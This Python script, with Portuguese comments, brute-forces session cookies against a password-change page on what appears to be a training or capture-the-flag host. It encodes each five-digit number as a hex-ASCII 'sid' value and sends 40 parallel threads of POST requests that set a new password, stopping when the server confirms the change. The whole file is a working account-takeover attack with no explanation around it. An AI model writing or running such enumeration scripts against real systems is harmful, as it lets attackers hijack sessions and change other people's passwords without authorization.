import threading
import requests

# Função que faz a requisição
foundResponse = False
numberFound = -1




def fazer_requisicao(numberStart, numberEnd):
    print("criou - ", numberStart, " - ", numberEnd)
    # session = requests.session()

    global foundResponse
    global numberFound
    
    url = 'http://kshvaelz2iaadzc91jxtus2r10t8.tempest.net.br:8014/purple/change_password.php'
    headers = {
        'Host': 'kshvaelz2iaadzc91jxtus2r10t8.tempest.net.br:8014',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://kshvaelz2iaadzc91jxtus2r10t8.tempest.net.br:8014/purple/change_password.php',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': 'sid=3130303031; FALHAS=0',
    }

    data = {
        'senha': '123',
        'confirma_senha': '123',
    }

    for i in range(int(numberStart), int(numberEnd)):
        formatted_number = f'{i:05d}'
        number = -1
        sid = str(int(formatted_number[0]) + 30) + str(int(formatted_number[1]) + 30) + str(int(formatted_number[2]) + 30) + str(int(formatted_number[3]) + 30) + str(int(formatted_number[4]) + 30)
        headers['Cookie'] = f'sid={sid}; FALHAS=0'
        response = requests.post(url=url, headers=headers, data=data)
        
        find = response.text.find('Senha alterada com sucesso')
        if (find != -1 and sid != '3130303031'):
            print("achou")
            print(f"Requisição para concluída com código de status {response.status_code} que possui mfa-code: {sid}, urlPostLogin2", response.cookies, response.content)
            foundResponse = True
            numberFound = sid
            number = sid
        elif (response.status_code != 200):
            print("deu ruim", response.status_code, response.text, formatted_number,  sid)
            foundResponse = True
            numberFound = sid
            number = sid
        else:
            print(sid, find, response.status_code, headers['Cookie'])
        
        if foundResponse:
            break

    print("aque: ", numberStart, " - ", numberEnd, " - ", number)
    

def createThreads(n, nthreads):
    threads = []

    for i in range(1, nthreads+1):
        ranges = [(n/nthreads * i) - (n/nthreads), (n/nthreads * i)]
        thread = threading.Thread(target=fazer_requisicao, args=(ranges[0], ranges[1]))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("Todas as possibilidades foram concluídas.")
    if (foundResponse):
        print(f"achamos o codigo {numberFound}")


nthreads = 40
n = 100000


createThreads(n, nthreads)

